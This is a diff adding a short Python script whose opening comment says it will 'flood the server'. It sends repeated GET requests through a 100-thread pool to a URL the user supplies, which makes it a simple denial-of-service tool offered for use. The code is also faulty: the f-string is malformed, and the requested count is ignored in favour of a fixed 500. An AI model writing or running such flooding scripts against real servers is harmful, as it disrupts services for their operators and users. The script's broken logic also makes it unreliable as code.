@@ -1,0 +1,22 @@
+We need to write a script that will flood the server
+
+import requests
+from concurrent.futures import ThreadPoolExecutor
+
+URL = input("Enter the base url: ")
+num_req = int(input("Enter the number of requests to flood the server with: "))
+
+def send_request():
+  try:
+    r = requests.get(URL, timeout=3)
+    return r
+  except:
+    return None
+
+print("Try reloading the page a few times till ThreadPoolExecutor will flood the page with f{num_req} requests..")
+with ThreadPoolExecutor(max_workers=100) as executor:
+  for _ in range(500):
+    executor.submit(send_request)
+
+
+
